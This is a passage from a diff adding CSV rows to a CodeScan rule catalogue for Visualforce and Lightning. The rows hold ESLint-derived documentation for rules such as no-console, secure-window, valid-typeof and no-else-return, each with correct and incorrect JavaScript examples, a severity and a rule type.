+<pre><code class=""js language-js"">[""error"", ""always"", {""null"": ""ignore""}]
+</code></pre>
+<h2 id=""whennottouseit"">When Not To Use It</h2>
+<p>If you don't want to enforce a style for using equality operators, then it's safe to disable this rule.</p>",MINOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-console,disallow the use of `console`,"<p>In JavaScript that is designed to be executed in the browser, it's considered a best practice to avoid using methods on <code>console</code>. Such messages are considered to be for debugging purposes and therefore not suitable to ship to the client. In general, calls using <code>console</code> should be stripped before being pushed to production.</p>
+<pre><code class=""js language-js"">console.log(""Made it here."");
+console.error(""That shouldn't have happened."");
+</code></pre>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule disallows calls to methods of the <code>console</code> object.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-console: ""error""*/
+
+console.log(""Log a debug level message."");
+console.warn(""Log a warn level message."");
+console.error(""Log an error level message."");
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-console: ""error""*/
+
+// custom console
+Console.log(""Hello world!"");
+</code></pre>
+<h2 id=""options"">Options</h2>
+<p>This rule has an object option for exceptions:</p>
+<ul>
+<li><code>""allow""</code> has an array of strings which are allowed methods of the <code>console</code> object</li>
+</ul>
+<p>Examples of additional <strong>correct</strong> code for this rule with a sample <code>{ ""allow"": [""warn"", ""error""] }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-console: [""error"", { allow: [""warn"", ""error""] }] */
+
+console.warn(""Log a warn level message."");
+console.error(""Log an error level message."");
+</code></pre>
+<h2 id=""whennottouseit"">When Not To Use It</h2>
+<p>If you're using Node.js, however, <code>console</code> is used to output information to the user and so is not strictly used for debugging purposes. If you are developing for Node.js then you most likely do not want this rule enabled.</p>
+<p>Another case where you might not use this rule is if you want to enforce console calls and not console overwrites. For example:</p>
+<pre><code class=""js language-js"">/*eslint no-console: [""error"", { allow: [""warn""] }] */
+console.error = function (message) {
+  throw new Error(message);
+};
+</code></pre>
+<p>With the <code>no-console</code> rule in the above example, ESLint will report an error. For the above example, you can disable the rule:</p>
+<pre><code class=""js language-js"">// eslint-disable-next-line no-console
+console.error = function (message) {
+  throw new Error(message);
+};
+
+// or
+
+console.error = function (message) {  // eslint-disable-line no-console
+  throw new Error(message);
+};
+</code></pre>
+<p>However, you might not want to manually add <code>eslint-disable-next-line</code> or <code>eslint-disable-line</code>. You can achieve the effect of only receiving errors for console calls with the <code>no-restricted-syntax</code> rule:</p>
+<pre><code class=""json language-json"">{
+    ""rules"": {
+        ""no-console"": ""off"",
+        ""no-restricted-syntax"": [
+            ""error"",
+            {
+                ""selector"": ""CallExpression[callee.object.name='console'][callee.property.name!=/^(log|warn|error|info|trace)$/]"",
+                ""message"": ""Unexpected property on console object was called""
+            }
+        ]
+    }
+}
+</code></pre>",MINOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:secure-window,validate window global access,"<p>This rule makes sure that only supported properties and functions are used to access the window global.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>When the rule is enabled, unsupported calls or API objects are disallowed.  Your Lightning components are permitted to use:</p>
+<ul>
+<li>Standard Lightning Component Framework features.</li>
+<li>Standard Javascript features.</li>
+<li>Standard Locker Service SecureObject object features. </li>
+</ul>
+<p>All disallowed uses are shown in red on this <a href=""http://documentation.auraframework.org/lockerApiTest/index.app?aura.mode=DEV"">Window vs SecureWindow Compatibility Table</a>.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">window.top;  //The use of window.top is disallowed.
+window.setImmediate(); //The use of window.setImmediate() is disallowed.
+</code></pre>",BLOCKER,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:unknown,CodeScan Other Rules,<p>This is reserved for future rules and expansion of the plugin. Do not turn this off.</p>,MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:valid-typeof,enforce comparing `typeof` expressions against valid strings,"<p>For a vast majority of use cases, the result of the <code>typeof</code> operator is one of the following string literals: <code>""undefined""</code>, <code>""object""</code>, <code>""boolean""</code>, <code>""number""</code>, <code>""string""</code>, <code>""function""</code> and <code>""symbol""</code>. It is usually a typing mistake to compare the result of a <code>typeof</code> operator to other string literals.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule enforces comparing <code>typeof</code> expressions to valid string literals.</p>
+<h2 id=""options"">Options</h2>
+<p>This rule has an object option:</p>
+<ul>
+<li><code>""requireStringLiterals"": true</code> requires <code>typeof</code> expressions to only be compared to string literals or other <code>typeof</code> expressions, and disallows comparisons to any other value.</li>
+</ul>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint valid-typeof: ""error""*/
+
+typeof foo === ""strnig""
+typeof foo == ""undefimed""
+typeof bar != ""nunber""
+typeof bar !== ""function""
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint valid-typeof: ""error""*/
+
+typeof foo === ""string""
+typeof bar == ""undefined""
+typeof foo === baz
+typeof bar === typeof qux
+</code></pre>
+<p>Examples of <strong>incorrect</strong> code with the <code>{ ""requireStringLiterals"": true }</code> option:</p>
+<pre><code class=""js language-js"">typeof foo === undefined
+typeof bar == Object
+typeof baz === ""strnig""
+typeof qux === ""some invalid type""
+typeof baz === anotherVariable
+typeof foo == 5
+</code></pre>
+<p>Examples of <strong>correct</strong> code with the <code>{ ""requireStringLiterals"": true }</code> option:</p>
+<pre><code class=""js language-js"">typeof foo === ""undefined""
+typeof bar == ""object""
+typeof baz === ""string""
+typeof bar === typeof qux
+</code></pre>
+<h2 id=""whennottouseit"">When Not To Use It</h2>
+<p>You may want to turn this rule off if you will be using the <code>typeof</code> operator on host objects.</p>",MAJOR,Visual Force & Lightning,BUG,FALSE
+cs-vf:no-iterator,disallow the use of the `__iterator__` property,"<p>The <code>__iterator__</code> property was a SpiderMonkey extension to JavaScript that could be used to create custom iterators that are compatible with JavaScript's <code>for in</code> and <code>for each</code> constructs. However, this property is now obsolete, so it should not be used. Here's an example of how this used to work:</p>
+<pre><code class=""js language-js"">Foo.prototype.__iterator__ = function() {
+    return new FooIterator(this);
+}
+</code></pre>
+<p>You should use ECMAScript 6 iterators and generators instead.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule is aimed at preventing errors that may arise from using the <code>__iterator__</code> property, which is not implemented in several browsers. As such, it will warn whenever it encounters the <code>__iterator__</code> property.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-iterator: ""error""*/
+
+Foo.prototype.__iterator__ = function() {
+    return new FooIterator(this);
+};
+
+foo.__iterator__ = function () {};
+
+foo[""__iterator__""] = function () {};
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-iterator: ""error""*/
+
+var __iterator__ = foo; // Not using the `__iterator__` property.
+</code></pre>
+<h2 id=""furtherreading"">Further Reading</h2>
+<ul>
+<li><a href=""https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Iterators_and_Generators"">MDN - Iterators and Generators</a></li>
+<li><a href=""https://kangax.github.io/es5-compat-table/es6/#Iterators"">ECMAScript 6 compatibility table - Iterators</a></li>
+<li><a href=""https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Deprecated_and_obsolete_features#Object_methods"">Deprecated and Obsolete Features</a></li>
+</ul>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-empty-character-class,disallow empty character classes in regular expressions,"<p>Because empty character classes in regular expressions do not match anything, they might be typing mistakes.</p>
+<pre><code class=""js language-js"">var foo = /^abc[]/;
+</code></pre>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule disallows empty character classes in regular expressions.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-empty-character-class: ""error""*/
+
+/^abc[]/.test(""abcdefg""); // false
+""abcdefg"".match(/^abc[]/); // null
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-empty-character-class: ""error""*/
+
+/^abc/.test(""abcdefg""); // true
+""abcdefg"".match(/^abc/); // [""abc""]
+
+/^abc[a-z]/.test(""abcdefg""); // true
+""abcdefg"".match(/^abc[a-z]/); // [""abcd""]
+</code></pre>
+<h2 id=""knownlimitations"">Known Limitations</h2>
+<p>This rule does not report empty character classes in the string argument of calls to the <code>RegExp</code> constructor.</p>
+<p>Example of a <em>false negative</em> when this rule reports correct code:</p>
+<pre><code class=""js language-js"">/*eslint no-empty-character-class: ""error""*/
+
+var abcNeverMatches = new RegExp(""^abc[]"");
+</code></pre>",MINOR,Visual Force & Lightning,BUG,FALSE
+cs-vf:no-constant-condition,disallow constant expressions in conditions,"<p>A constant expression (for example, a literal) as a test condition might be a typo or development trigger for a specific behavior. For example, the following code looks as if it is not ready for production.</p>
+<pre><code class=""js language-js"">if (false) {
+    doSomethingUnfinished();
+}
+</code></pre>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule disallows constant expressions in the test condition of:</p>
+<ul>
+<li><code>if</code>, <code>for</code>, <code>while</code>, or <code>do...while</code> statement</li>
+<li><code>?:</code> ternary expression</li>
+</ul>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-constant-condition: ""error""*/
+
+if (false) {
+    doSomethingUnfinished();
+}
+
+if (void x) {
+    doSomethingUnfinished();
+}
+
+for (;-2;) {
+    doSomethingForever();
+}
+
+while (typeof x) {
+    doSomethingForever();
+}
+
+do {
+    doSomethingForever();
+} while (x = -1);
+
+var result = 0 ? a : b;
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-constant-condition: ""error""*/
+
+if (x === 0) {
+    doSomething();
+}
+
+for (;;) {
+    doSomethingForever();
+}
+
+while (typeof x === ""undefined"") {
+    doSomething();
+}
+
+do {
+    doSomething();
+} while (x);
+
+var result = x !== 0 ? a : b;
+</code></pre>
+<h2 id=""options"">Options</h2>
+<h3 id=""checkloops"">checkLoops</h3>
+<p>Set to <code>true</code> by default. Setting this option to <code>false</code> allows constant expressions in loops.</p>
+<p>Examples of <strong>correct</strong> code for when <code>checkLoops</code> is <code>false</code>:</p>
+<pre><code class=""js language-js"">/*eslint no-constant-condition: [""error"", { ""checkLoops"": false }]*/
+
+while (true) {
+    doSomething();
+    if (condition()) {
+        break;
+    }
+};
+
+for (;true;) {
+    doSomething();
+    if (condition()) {
+        break;
+    }
+};
+
+do {
+    doSomething();
+    if (condition()) {
+        break;
+    }
+} while (true)
+</code></pre>",MAJOR,Visual Force & Lightning,BUG,FALSE
+cs-vf:dot-notation,enforce dot notation,"<p>In JavaScript, one can access properties using the dot notation (<code>foo.bar</code>) or square-bracket notation (<code>foo[""bar""]</code>). However, the dot notation is often preferred because it is easier to read, less verbose, and works better with aggressive JavaScript minimizers.</p>
+<pre><code class=""js language-js"">foo[""bar""];
+</code></pre>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule is aimed at maintaining code consistency and improving code readability by encouraging use of the dot notation style whenever possible. As such, it will warn when it encounters an unnecessary use of square-bracket notation.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint dot-notation: ""error""*/
+
+var x = foo[""bar""];
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint dot-notation: ""error""*/
+
+var x = foo.bar;
+
+var x = foo[bar];    // Property name is a variable, square-bracket notation required
+</code></pre>
+<h2 id=""options"">Options</h2>
+<p>This rule accepts a single options argument:</p>
+<ul>
+<li>Set the <code>allowKeywords</code> option to <code>false</code> (default is <code>true</code>) to follow ECMAScript version 3 compatible style, avoiding dot notation for reserved word properties.</li>
+<li>Set the <code>allowPattern</code> option to a regular expression string to allow bracket notation for property names that match a pattern (by default, no pattern is tested).</li>
+</ul>
+<h3 id=""allowkeywords"">allowKeywords</h3>
+<p>Examples of <strong>correct</strong> code for the <code>{ ""allowKeywords"": false }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint dot-notation: [""error"", { ""allowKeywords"": false }]*/
+
+var foo = { ""class"": ""CS 101"" }
+var x = foo[""class""]; // Property name is a reserved word, square-bracket notation required
+</code></pre>
+<h3 id=""allowpattern"">allowPattern</h3>
+<p>For example, when preparing data to be sent to an external API, it is often required to use property names that include underscores.  If the <code>camelcase</code> rule is in effect, these <a href=""https://en.wikipedia.org/wiki/Snake_case"">snake case</a> properties would not be allowed.  By providing an <code>allowPattern</code> to the <code>dot-notation</code> rule, these snake case properties can be accessed with bracket notation.</p>
+<p>Examples of <strong>correct</strong> code for the sample <code>{ ""allowPattern"": ""^[a-z]+(_[a-z]+)+$"" }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint camelcase: ""error""*/
+/*eslint dot-notation: [""error"", { ""allowPattern"": ""^[a-z]+(_[a-z]+)+$"" }]*/
+
+var data = {};
+data.foo_bar = 42;
+
+var data = {};
+data[""fooBar""] = 42;
+
+var data = {};
+data[""foo_bar""] = 42; // no warning
+</code></pre>",MINOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-throw-literal,disallow throwing literals as exceptions,"<p>It is considered good practice to only <code>throw</code> the <code>Error</code> object itself or an object using the <code>Error</code> object as base objects for user-defined exceptions.
+The fundamental benefit of <code>Error</code> objects is that they automatically keep track of where they were built and originated.</p>
+<p>This rule restricts what can be thrown as an exception.  When it was first created, it only prevented literals from being thrown (hence the name), but it has now been expanded to only allow expressions which have a possibility of being an <code>Error</code> object.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule is aimed at maintaining consistency when throwing exception by disallowing to throw literals and other expressions which cannot possibly be an <code>Error</code> object.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-throw-literal: ""error""*/
+/*eslint-env es6*/
+
+throw ""error"";
+
+throw 0;
+
+throw undefined;
+
+throw null;
+
+var err = new Error();
+throw ""an "" + err;
+// err is recast to a string literal
+
+var err = new Error();
+throw `${err}`
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-throw-literal: ""error""*/
+
+throw new Error();
+
+throw new Error(""error"");
+
+var e = new Error(""error"");
+throw e;
+
+try {
+    throw new Error(""error"");
+} catch (e) {
+    throw e;
+}
+</code></pre>
+<h2 id=""knownlimitations"">Known Limitations</h2>
+<p>Due to the limits of static analysis, this rule cannot guarantee that you will only throw <code>Error</code> objects.</p>
+<p>Examples of <strong>correct</strong> code for this rule, but which do not throw an <code>Error</code> object:</p>
+<pre><code class=""js language-js"">/*eslint no-throw-literal: ""error""*/
+
+var err = ""error"";
+throw err;
+
+function foo(bar) {
+    console.log(bar);
+}
+throw foo(""error"");
+
+throw new String(""error"");
+
+var foo = {
+    bar: ""error""
+};
+throw foo.bar;
+</code></pre>",MINOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:handle-callback-err,require error handling in callbacks,"<p>In Node.js, a common pattern for dealing with asynchronous behavior is called the callback pattern.
+This pattern expects an <code>Error</code> object or <code>null</code> as the first argument of the callback.
+Forgetting to handle these errors can lead to some really strange behavior in your application.</p>
+<pre><code class=""js language-js"">function loadData (err, data) {
+    doSomething(); // forgot to handle error
+}
+</code></pre>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule expects that when you're using the callback pattern in Node.js you'll handle the error.</p>
+<h2 id=""options"">Options</h2>
+<p>The rule takes a single string option: the name of the error parameter. The default is <code>""err""</code>.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule with the default <code>""err""</code> parameter name:</p>
+<pre><code class=""js language-js"">/*eslint handle-callback-err: ""error""*/
+
+function loadData (err, data) {
+    doSomething();
+}
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule with the default <code>""err""</code> parameter name:</p>
+<pre><code class=""js language-js"">/*eslint handle-callback-err: ""error""*/
+
+function loadData (err, data) {
+    if (err) {
+        console.log(err.stack);
+    }
+    doSomething();
+}
+
+function generateError (err) {
+    if (err) {}
+}
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule with a sample <code>""error""</code> parameter name:</p>
+<pre><code class=""js language-js"">/*eslint handle-callback-err: [""error"", ""error""]*/
+
+function loadData (error, data) {
+    if (error) {
+       console.log(error.stack);
+    }
+    doSomething();
+}
+</code></pre>
+<h3 id=""regularexpression"">regular expression</h3>
+<p>Sometimes (especially in big projects) the name of the error variable is not consistent across the project,
+so you need a more flexible configuration to ensure that the rule reports all unhandled errors.</p>
+<p>If the configured name of the error variable begins with a <code>^</code> it is considered to be a regexp pattern.</p>
+<ul>
+<li>If the option is <code>""^(err|error|anySpecificError)$""</code>, the rule reports unhandled errors where the parameter name can be <code>err</code>, <code>error</code> or <code>anySpecificError</code>.</li>
+<li>If the option is <code>""^.+Error$""</code>, the rule reports unhandled errors where the parameter name ends with <code>Error</code> (for example, <code>connectionError</code> or <code>validationError</code> will match).</li>
+<li>If the option is <code>""^.*(e|E)rr""</code>, the rule reports unhandled errors where the parameter name matches any string that contains <code>err</code> or <code>Err</code> (for example, <code>err</code>, <code>error</code>, <code>anyError</code>, <code>some_err</code> will match).</li>
+</ul>
+<h2 id=""whennottouseit"">When Not To Use It</h2>
+<p>There are cases where it may be safe for your application to ignore errors, however only ignore errors if you are
+confident that some other form of monitoring will help you catch the problem.</p>
+<h2 id=""furtherreading"">Further Reading</h2>
+<ul>
+<li><a href=""https://github.com/maxogden/art-of-node#callbacks"">The Art Of Node: Callbacks</a></li>
+<li><a href=""https://docs.nodejitsu.com/articles/errors/what-are-the-error-conventions/"">Nodejitsu: What are the error conventions?</a></li>
+</ul>",MINOR,Visual Force & Lightning,BUG,FALSE
+cs-vf:exception,Tracks CodeScan Eslint Exceptions,<p>Violations of this rule may occur due to parsing errors and other exceptions thrown by the Javascript rule set.  Do not turn this off.</p>,BLOCKER,Visual Force & Lightning,BUG,FALSE
+cs-vf:no-new-object,disallow `Object` constructors,"<p>The <code>Object</code> constructor is used to create new generic objects in JavaScript, such as:</p>
+<pre><code class=""js language-js"">var myObject = new Object();
+</code></pre>
+<p>However, this is no different from using the more concise object literal syntax:</p>
+<pre><code class=""js language-js"">var myObject = {};
+</code></pre>
+<p>For this reason, many prefer to always use the object literal syntax and never use the <code>Object</code> constructor.</p>
+<p>While there are no performance differences between the two approaches, the byte savings and conciseness of the object literal form is what has made it the de facto way of creating new objects.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule disallows <code>Object</code> constructors.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-new-object: ""error""*/
+
+var myObject = new Object();
+
+var myObject = new Object;
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-new-object: ""error""*/
+
+var myObject = new CustomObject();
+
+var myObject = {};
+</code></pre>
+<h2 id=""whennottouseit"">When Not To Use It</h2>
+<p>If you wish to allow the use of the <code>Object</code> constructor, you can safely turn this rule off.</p>",MINOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-else-return,disallow `else` blocks after `return` statements in `if` statements,"<p>If an <code>if</code> block contains a <code>return</code> statement, the <code>else</code> block becomes unnecessary. Its contents can be placed outside of the block.</p>
+<pre><code class=""js language-js"">function foo() {
+    if (x) {
+        return y;
+    } else {
+        return z;
+    }
+}
+</code></pre>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule is aimed at highlighting an unnecessary block of code following an <code>if</code> containing a return statement. As such, it will warn when it encounters an <code>else</code> following a chain of <code>if</code>s, all of them containing a <code>return</code> statement.</p>
+<h2 id=""options"">Options</h2>
+<p>This rule has an object option:</p>
+<pre><code class=""json language-json"">{
+    ""no-else-return"": [""error"", { ""allowElseIf"": true }],
+    // or
+    ""no-else-return"": [""error"", { ""allowElseIf"": false }]
+}
+</code></pre>
+<ul>
+<li><code>allowElseIf: true</code> (default) allows <code>else if</code> blocks after a return</li>
+<li><code>allowElseIf: false</code> disallows <code>else if</code> blocks after a return</li>
+</ul>
+<h3 id=""allowelseiftrue""><code>allowElseIf: true</code></h3>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-else-return: ""error""*/
+
+function foo() {
+    if (x) {
+        return y;
+    } else {
+        return z;
+    }
+}
+
+function foo() {
+    if (x) {
+        return y;
+    } else if (z) {
+        return w;
+    } else {
+        return t;
+    }
+}
+
+function foo() {
+    if (x) {
+        return y;
+    } else {
+        var t = ""foo"";
+    }
+
+    return t;
+}
+
+function foo() {
+    if (error) {
+        return 'It failed';
+    } else {
+        if (loading) {
+            return ""It's still loading"";
+        }
+    }
+}
+
+// Two warnings for nested occurrences
+function foo() {
+    if (x) {
+        if (y) {
+            return y;
+        } else {
+            return x;
+        }
+    } else {
+        return z;
+    }
+}
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-else-return: ""error""*/
+
+function foo() {
+    if (x) {
+        return y;
+    }
+
+    return z;
+}
+
+function foo() {
+    if (x) {
+        return y;
+    } else if (z) {
+        var t = ""foo"";
+    } else {
+        return w;
+    }
+}
+
+function foo() {
+    if (x) {
+        if (z) {
+            return y;
+        }
+    } else {
+        return z;
+    }
+}
+
+function foo() {
+    if (error) {
+        return 'It failed';
+    } else if (loading) {
+        return ""It's still loading"";
+    }
+}
+</code></pre>
+<h3 id=""allowelseiffalse""><code>allowElseIf: false</code></h3>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-else-return: [""error"", {allowElseIf: false}]*/
+
+function foo() {
+    if (error) {
+        return 'It failed';
+    } else if (loading) {
+        return ""It's still loading"";
+    }
+}
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-else-return: [""error"", {allowElseIf: false}]*/
+
+function foo() {
+    if (error) {
+        return 'It failed';
+    }
+
+    if (loading) {
+        return ""It's still loading"";
+    }
+}
+</code></pre>",MINOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-new-wrappers,"disallow `new` operators with the `String`, `Number`, and `Boolean` objects","<p>There are three primitive types in JavaScript that have wrapper objects: string, number, and boolean. These are represented by the constructors <code>String</code>, <code>Number</code>, and <code>Boolean</code>, respectively. The primitive wrapper types are used whenever one of these primitive values is read, providing them with object-like capabilities such as methods. Behind the scenes, an object of the associated wrapper type is created and then destroyed, which is why you can call methods on primitive values, such as:</p>
+<pre><code class=""js language-js"">var text = ""Hello world"".substring(2);
+</code></pre>
+<p>Behind the scenes in this example, a <code>String</code> object is constructed. The <code>substring()</code> method exists on <code>String.prototype</code> and so is accessible to the string instance.</p>
+<p>It's also possible to manually create a new wrapper instance:</p>
+<pre><code class=""js language-js"">var stringObject = new String(""Hello world"");
+var numberObject = new Number(33);
+var booleanObject = new Boolean(false);
+</code></pre>
+<p>Although possible, there aren't any good reasons to use these primitive wrappers as constructors. They tend to confuse other developers more than anything else because they seem like they should act as primitives, but they do not. For example:</p>
+<pre><code class=""js language-js"">var stringObject = new String(""Hello world"");
+console.log(typeof stringObject);       // ""object""
+
+var text = ""Hello world"";
+console.log(typeof text);               // ""string""
+
+var booleanObject = new Boolean(false);
+if (booleanObject) {    // all objects are truthy!
+    console.log(""This executes"");
+}
+</code></pre>
+<p>The first problem is that primitive wrapper objects are, in fact, objects. That means <code>typeof</code> will return <code>""object""</code> instead of <code>""string""</code>, <code>""number""</code>, or <code>""boolean""</code>. The second problem comes with boolean objects. Every object is truthy, that means an instance of <code>Boolean</code> always resolves to <code>true</code> even when its actual value is <code>false</code>.</p>
+<p>For these reasons, it's considered a best practice to avoid using primitive wrapper types with <code>new</code>.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule aims to eliminate the use of <code>String</code>, <code>Number</code>, and <code>Boolean</code> with the <code>new</code> operator. As such, it warns whenever it sees <code>new String</code>, <code>new Number</code>, or <code>new Boolean</code>.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-new-wrappers: ""error""*/
+
+var stringObject = new String(""Hello world"");
+var numberObject = new Number(33);
+var booleanObject = new Boolean(false);
+
+var stringObject = new String;
+var numberObject = new Number;
+var booleanObject = new Boolean;
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-new-wrappers: ""error""*/
+
+var text = String(someValue);
+var num = Number(someValue);
+
+var object = new MyString();
+</code></pre>
+<h2 id=""whennottouseit"">When Not To Use It</h2>
+<p>If you want to allow the use of primitive wrapper objects, then you can safely disable this rule.</p>
+<h2 id=""furtherreading"">Further Reading</h2>
+<ul>
+<li><a href=""https://www.inkling.com/read/javascript-definitive-guide-david-flanagan-6th/chapter-3/wrapper-objects"">Wrapper objects</a></li>
+</ul>",MINOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-eq-null,disallow `null` comparisons without type-checking operators,"<p>Comparing to <code>null</code> without a type-checking operator (<code>==</code> or <code>!=</code>), can have unintended results as the comparison will evaluate to true when comparing to not just a <code>null</code>, but also an <code>undefined</code> value.</p>
+<pre><code class=""js language-js"">if (foo == null) {
+  bar();
+}
+</code></pre>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>The <code>no-eq-null</code> rule aims reduce potential bug and unwanted behavior by ensuring that comparisons to <code>null</code> only match <code>null</code>, and not also <code>undefined</code>. As such it will flag comparisons to null when using <code>==</code> and <code>!=</code>.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-eq-null: ""error""*/
+
+if (foo == null) {
+  bar();
+}
+
+while (qux != null) {
+  baz();
+}
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-eq-null: ""error""*/
+
+if (foo === null) {
+  bar();
+}
+
+while (qux !== null) {
+  baz();
+}
+</code></pre>",MAJOR,Visual Force & Lightning,BUG,FALSE
+cs-vf:no-new,disallow `new` operators outside of assignments or comparisons,"<p>The goal of using <code>new</code> with a constructor is typically to create an object of a particular type and store that object in a variable, such as:</p>
+<pre><code class=""js language-js"">var person = new Person();
+</code></pre>
+<p>It's less common to use <code>new</code> and not store the result, such as:</p>
+<pre><code class=""js language-js"">new Person();
+</code></pre>
+<p>In this case, the created object is thrown away because its reference isn't stored anywhere, and in many cases, this means that the constructor should be replaced with a function that doesn't require <code>new</code> to be used.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule is aimed at maintaining consistency and convention by disallowing constructor calls using the <code>new</code> keyword that do not assign the resulting object to a variable.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-new: ""error""*/
+
+new Thing();
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-new: ""error""*/
+
+var thing = new Thing();
+
+Thing();
+</code></pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:ItalicTagsCheck,"""em"" Tags Should Be Used Instead of ""i""","<p>
+The &lt;strong&gt;/&lt;b&gt; and &lt;em&gt;/&lt;i&gt; tags have exactly the same effect in most web browsers, but there is a fundamental difference between them: &lt;strong&gt; and &lt;em&gt; have a semantic meaning whereas &lt;b&gt; and &lt;i&gt; only convey styling information like CSS.
+</p>
+
+<p>
+When &lt;b&gt; can have simply no effect on a Palm device with limited display or when a screen reader software is used by a blind person, &lt;strong&gt; will:
+</p>
+
+<ul>
+  <li>Underline the characters on a Palm Pilot</li>
+  <li>Speak with lower tone when using a screen reader such as Jaws</li>
+  <li>And display the text bold in normal browsers</li>
+</ul>
+
+<p>Consequently:</p>
+
+<ul>
+  <li>in order to convey semantics, the &lt;b&gt; and &lt;i&gt; tags shall never be used,</li>
+  <li>in order to convey styling information, the &lt;b&gt; and &lt;i&gt; should be avoided and CSS should be used instead.</li>
+</ul>
+
+
+
+     
+
+
+<h2>Noncompliant Code Example</h2>
+
+<pre>
+&lt;i&gt;car&lt;/i&gt;                 //Bad: this is not recommended.
+&lt;b&gt;train&lt;/b&gt;               //Bad: this is not recommended.
+</pre>
+
+<h2>Compliant Solution</h2>
+
+<pre>
+&lt;em&gt;car&lt;/em&gt;               //Good: this is preferred.
+&lt;strong&gt;train&lt;/strong&gt;     //Good: this is preferred.
+</pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-param-reassign,disallow reassigning `function` parameters,"<h1 id=""disallowreassignmentoffunctionparametersnoparamreassign"">Disallow Reassignment of Function Parameters (no-param-reassign)</h1>
+<p>Assignment to variables declared as function parameters can be misleading and lead to confusing behavior, as modifying function parameters will also mutate the <code>arguments</code> object. Often, assignment to function parameters is unintended and indicative of a mistake or programmer error.</p>
+<p>This rule can be also configured to fail when function parameters are modified. Side effects on parameters can cause counter-intuitive execution flow and make errors difficult to track down.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule aims to prevent unintended behavior caused by modification or reassignment of function parameters.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-param-reassign: ""error""*/
+
+function foo(bar) {
